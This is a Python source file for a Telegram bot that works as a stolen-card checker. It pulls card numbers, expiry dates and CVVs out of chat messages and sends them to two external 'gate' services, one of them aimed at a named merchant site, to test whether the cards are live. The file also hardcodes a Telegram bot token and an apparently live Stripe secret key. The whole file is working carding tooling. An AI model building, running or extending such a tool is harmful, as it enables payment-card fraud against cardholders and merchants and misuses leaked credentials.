import telebot
import httpx
import re
import time
from telebot import types
from concurrent.futures import ThreadPoolExecutor

# --- CONFIGURATION ---
TOKEN = "8318488317:AAFyfOLjIAY-p8GaJXmPlhXCu82R3_XEqgU"
bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

# Use a thread pool for parallel API calls (The "Both" feature)
executor = ThreadPoolExecutor(max_workers=10)

# --- UI COMPONENTS ---

def get_main_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        types.KeyboardButton("💳 Check Card"), 
        types.KeyboardButton("👤 My Profile"),
        types.KeyboardButton("📊 Stats"),
        types.KeyboardButton("🛠 Support")
    )
    return markup

def get_gate_inline(cc_data):
    markup = types.InlineKeyboardMarkup()
    btn1 = types.InlineKeyboardButton("⚡ SK BASED", callback_data=f"gate_sk|{cc_data}")
    btn2 = types.InlineKeyboardButton("🔥 AUTO STRIPE", callback_data=f"gate_as|{cc_data}")
    btn3 = types.InlineKeyboardButton("🚀 CHECK BOTH GATES", callback_data=f"gate_both|{cc_data}")
    markup.row(btn1, btn2)
    markup.row(btn3)
    return markup

# --- CORE API ENGINE ---

def request_api(gate, cc):
    """Handles the heavy lifting of API calls."""
    try:
        if "sk" in gate:
            url = f"https://skbased.blinkop.online/?sk=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&amount=1&lista={cc}"
        else:
            url = f"https://autostripe.blinkop.online/check?gateway=autostripe&key=BlackXCard&site=chiwahwah.co.nz&cc={cc}"
            
        with httpx.Client(timeout=25.0) as client:
            start_time = time.time()
            response = client.get(url)
            elapsed = round(time.time() - start_time, 2)
            
            # Clean response text
            text = response.text.strip()
            if not text: text = "No Response from API"
            
            return {"status": "success", "data": text, "time": elapsed}
    except Exception as e:
        return {"status": "error", "data": str(e), "time": 0}

# --- HANDLERS ---

@bot.message_handler(commands=['start'])
def welcome(message):
    welcome_txt = (
        f"<b>Welcome, {message.from_user.first_name}!</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🤖 <b>Bot Status:</b> 🟢 <code>ONLINE</code>\n"
        f"💳 <b>Available Gates:</b> 02\n"
        f"🛡 <b>Security:</b> <code>ENCRYPTED</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"<i>Paste your card details to begin.</i>"
    )
    bot.send_message(message.chat.id, welcome_txt, reply_markup=get_main_keyboard())

@bot.message_handler(func=lambda m: m.text == "💳 Check Card")
def check_prompt(message):
    bot.send_message(message.chat.id, "<b>📥 Send your card details:</b>\n<code>CC|MM|YY|CVV</code>", parse_mode="HTML")

@bot.message_handler(func=lambda m: True)
def auto_detect_cc(message):
    # Advanced regex: detects cards even if they are in the middle of a sentence
    cards = re.findall(r'\d{15,16}[\s|/|-]\d{1,2}[\s|/|-]\d{2,4}[\s|/|-]\d{3,4}', message.text)
    
    if not cards:
        return

    for cc in cards[:5]: # Limit to 5 per message for stability
        # Normalize the card format to | separator
        clean_cc = cc.replace(" ", "|").replace("/", "|").replace("-", "|")
        
        caption = (
            f"<b>💳 Card Detected</b>\n"
            f"━━━━━━━━━━━━━━\n"
            f"📦 <b>BIN:</b> <code>{clean_cc[:6]}</code>\n"
            f"🔢 <b>Format:</b> <code>{clean_cc}</code>\n"
            f"━━━━━━━━━━━━━━"
        )
        bot.send_message(message.chat.id, caption, reply_markup=get_gate_inline(clean_cc))

@bot.callback_query_handler(func=lambda call: call.data.startswith("gate_"))
def process_check(call):
    _, gate_type, cc = call.data.split("|")
    
    # Update UI to loading state
    bot.edit_message_text(
        f"<b>🔍 PROCESSING REQUEST...</b>\n━━━━━━━━━━━━━━\n💳 <code>{cc}</code>\n⚙️ <i>Running algorithms...</i>",
        call.message.chat.id, call.message.message_id
    )

    if gate_type == "both":
        # Run BOTH APIs in parallel threads
        future_sk = executor.submit(request_api, "sk", cc)
        future_as = executor.submit(request_api, "as", cc)
        
        res_sk = future_sk.result()
        res_as = future_as.result()
        
        final_msg = (
            f"<b>✅ DUAL CHECK COMPLETE</b>\n"
            f"━━━━━━━━━━━━━━\n"
            f"💳 <b>CARD:</b> <code>{cc}</code>\n\n"
            f"⚡ <b>SK BASED:</b>\n┗ <code>{res_sk['data']}</code> (⏱ {res_sk['time']}s)\n\n"
            f"🔥 <b>AUTO STRIPE:</b>\n┗ <code>{res_as['data']}</code> (⏱ {res_as['time']}s)\n"
            f"━━━━━━━━━━━━━━\n"
            f"👤 <b>Checked by:</b> {call.from_user.first_name}"
        )
    else:
        # Single Gate Check
        res = request_api(gate_type, cc)
        gate_name = "SK BASED" if gate_type == "sk" else "AUTO STRIPE"
        
        final_msg = (
            f"<b>✅ CHECK COMPLETE</b>\n"
            f"━━━━━━━━━━━━━━\n"
            f"💳 <b>CARD:</b> <code>{cc}</code>\n"
            f"⚙️ <b>GATE:</b> <code>{gate_name}</code>\n"
            f"📝 <b>RESULT:</b> <code>{res['data']}</code>\n"
            f"⏱ <b>TIME:</b> <code>{res['time']}s</code>\n"
            f"━━━━━━━━━━━━━━"
        )

    bot.edit_message_text(final_msg, call.message.chat.id, call.message.message_id)

# --- START BOT ---
print("--- Bot Started Successfully ---")
bot.infinity_polling()
